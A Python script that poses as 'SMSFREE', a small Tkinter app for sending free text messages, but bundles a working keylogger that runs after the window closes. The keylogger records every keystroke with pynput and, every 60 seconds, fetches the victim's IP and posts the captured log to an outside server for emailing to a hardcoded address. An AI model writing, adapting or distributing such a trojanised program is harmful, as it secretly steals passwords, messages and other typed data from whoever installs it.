import pynput.keyboard
import threading
import requests
"""___________________________________"""
"""vista cliente"""
from tkinter import *
from tkinter import messagebox as MessageBox
import requests
""" Fin vista cliente"""
"""vista cliente"""


root = Tk()
root.title("SMSFREE")
root.geometry("430x200")
root.resizable(0, 0)
def contact():
    you = StringVar()
    you.set("https://www.youtube.com/channel/UCSJ0FKKF-tUeu_Oa-1Z07lA")
    Label(root, text="Youtube: ").grid(row=4, column=0)
    Entry(root, textvariable=you, width=45).grid(row=4, column=1)
    Label(root, text="Created By Piter", font="bold").grid(row=5, column=1)

def exit():
    root.destroy()
    

def enviar():
    enti1 = ent1.get()
    enti2 = ent2.get()
    if enti1 == "" or enti2 == "":
        MessageBox.showinfo("Error", "No puede dejar campos vacios")
    else:
        resp = requests.post('https://textbelt.com/text', {
          'phone': enti1,
          'message': enti2,
          'key': 'textbelt',
          })
        string = str(resp.json())
        
        if "error" in string:
            MessageBox.showinfo("Error", "No puede enviar mensajes a este numero")
        else:
            MessageBox.showinfo("Enviado", "Mensaje enviado al \n " + enti1)
            ent1.set("")
            ent2.set("")

ent1 = StringVar()
ent2 = StringVar()
Button(root, text="Salir", command=exit).grid(row=0, column=2)
Label(root, text="PiterSk", font="bold").grid(row=0, column=0)
Label(root, text="Ponga el numero: ", fg="black").grid(row=1, column=0)
Entry(root, textvariable=ent1, width=45).grid(row=1, column=1)

Label(root, text="Escriba el MSG: ", fg="black").grid(row=2, column=0)
Entry(root, textvariable=ent2, width=45).grid(row=2, column=1)

Button(root, text="Enviar", command=enviar).grid(row=3, column=0)
Button(root, text="Contacto", command=contact).grid(row=3, column=1)
root.mainloop()
"""keyloger"""
"""______________________________________________________________"""
log = ""
def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def report():
    global log
    if len(log) > 0:
        print("[+] Enviando reporte...")
        print("[+] Report: " + log)
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
        ip = requests.get('http://panamasocail.com/ip.php', headers=headers).text
        print("[+] IP: " + ip)
        dat = "\nip:" + ip + "\n" + "\nreporte:" + log
        send = requests.post('https://panamasocail.com/smtp.php', data={'to': 'piterivano112@gmail.com', 'subject': ip, 'message': dat, 'from':'keylogger'}, headers=headers)
        envio = send.text
        if envio == 'Se envio el correo':
            print('Se envio el correo')
        else:
            print('Error', 'Error al enviar el mensaje')
            
    else:
        print("[-] No hay pulsaciones.")
    log = ""
    timer = threading.Timer(60, report)
    timer.start()
    
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
    
    
"""________________________Fin keylogger__________________________________________________________"""

"""fin keylogger"""


"""_______________________Fin vista cliente_________________________________"""
    
